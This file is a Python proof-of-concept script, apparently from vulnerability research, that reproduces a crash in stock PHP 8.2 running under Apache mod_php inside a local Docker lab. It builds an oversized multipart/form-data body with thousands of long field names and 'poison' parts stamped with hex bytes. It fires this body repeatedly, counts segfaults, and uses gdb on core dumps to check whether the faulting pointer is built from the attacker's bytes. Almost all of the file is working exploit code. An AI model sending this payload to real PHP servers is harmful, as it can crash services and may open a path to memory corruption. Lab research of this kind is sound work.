#!/usr/bin/env python3
"""oom61: STOCK-BINARY REPRODUCTION — the oom59c/oom60 attack against
completely stock php:8.2.34-apache mod_php. No instrument, no W2 probes,
no PHPRC. Only lab CONDITIONS (ini: memory_limit/max_input_vars/
post_max_size) remain, because they are part of the attack recipe.

Questions:
  1. Does unmodified stock crash on the same body? (determinism x4, across restart)
  2. Where does it fault? (core -> gdb si_addr; expect pointer built from
     our stamped bytes, ~0x3137363730307a7a-style ASCII, or 0x7a7a...)
  3. Benign discriminator: 30 clean requests after restore -> 0 segvs.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
NAMELEN = 3064
LIB = "/usr/lib/apache2/modules/libphp.so"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
CELLS = 10237


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, stamp_offset):
    idx = stamp_offset
    body = bytearray()
    for _ in range(CELLS):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        body += stamp + b"z" * 10
        idx += 1
    nm = b"q" + bytes(body) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3, stamp_base=0):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, stamp_base + n * CELLS) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=40):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return "HTTP%s" % e.code
    except Exception as e:
        return type(e).__name__


def full_logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def segv_count(logs):
    return len(re.findall(r"exit signal Segmentation", logs))


def main():
    print("=== [0] verify stock + lab CONDITIONS only ===", flush=True)
    md5 = sh("md5sum %s | cut -d' ' -f1" % LIB, 15)
    print("[md5]", md5, "OK" if md5 == STOCK_MD5 else "ABORT", flush=True)
    if md5 != STOCK_MD5:
        print("[ABORT] not stock", flush=True)
        return

    dcp(PHPLAB + "/oomlab.ini", "php_vuln:/usr/local/etc/php/conf.d/30-oomlab.ini")
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(25):
        time.sleep(1.5)
        probe = sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1)
        if "lim=20600000" in probe:
            break
    print("[ini]", probe, flush=True)
    if "lim=20600000" not in probe:
        print("[ABORT] lab conditions not active", flush=True)
        return
    print("[ulimit]", sh("grep ulimit /etc/apache2/envvars", 10), flush=True)

    base = segv_count(full_logs())
    att = build_attack()
    print("[attack]", len(att), "bytes; baseline segv=%d" % base, flush=True)

    print("=== [1] 2 fires, same run ===", flush=True)
    for i in range(2):
        code = http("/oom_mod.php", att, "multipart/form-data; boundary=BOUND")
        time.sleep(3)
        n = segv_count(full_logs())
        print("  fire%d: %s segv+=%d cores=%s"
              % (i, code, n - base, sh("ls /tmp/core* 2>/dev/null | wc -l", 10)), flush=True)
        base = n

    print("=== [2] restart + 2 fires ===", flush=True)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        http("/oom_sapi.php", timeout=5)
    for i in range(2):
        code = http("/oom_mod.php", att, "multipart/form-data; boundary=BOUND")
        time.sleep(3)
        n = segv_count(full_logs())
        print("  rst%d: %s segv+=%d cores=%s"
              % (i, code, n - base, sh("ls /tmp/core* 2>/dev/null | wc -l", 10)), flush=True)
        base = n

    print("=== [3] core decode ===", flush=True)
    ls = sh("ls -la /tmp/core*", 15, retries=1)
    print("[cores]", ls, flush=True)
    if ls.startswith("/tmp/core"):
        corep = ls.split()[-1]
        dcp("php_vuln:%s" % corep, PHPLAB + "/child.core.61")
        dcp(PHPLAB + "/libphp.so.stock", "phpbuild:/tmp/libphp.stock.so")
        dcp(PHPLAB + "/child.core.61", "phpbuild:/tmp/child.core.61")
        open("/tmp/g61.gdb", "w").write(
            "set pagination off\nbt 6\ninfo registers rip rdi rsi rax\n"
            "p $_siginfo._sifields._sigfault.si_addr\nx/2i $pc\n")
        r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                            "gdb -q -batch -x /tmp/g61.gdb /tmp/libphp.stock.so /tmp/child.core.61 2>&1 | tail -30"],
                           capture_output=True, timeout=180)
        print(r.stdout.decode("latin1", "replace"), flush=True)
    else:
        print("[no core] kernel core_pattern:", sh("cat /proc/sys/kernel/core_pattern", 10), flush=True)

    print("=== [4] restore full stock ===", flush=True)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        http("/oom_sapi.php", timeout=5)
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15),
          sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1), flush=True)

    print("=== [5] benign discriminator (30 requests) ===", flush=True)
    b = segv_count(full_logs())
    oks = 0
    for i in range(30):
        r = http("/oom_sapi.php", timeout=10)
        if r == 200:
            oks += 1
    time.sleep(2)
    print("benign oks=%d/30 segv+=%d" % (oks, segv_count(full_logs()) - b), flush=True)
    print("=== DONE ===", flush=True)


if __name__ == "__main__":
    main()
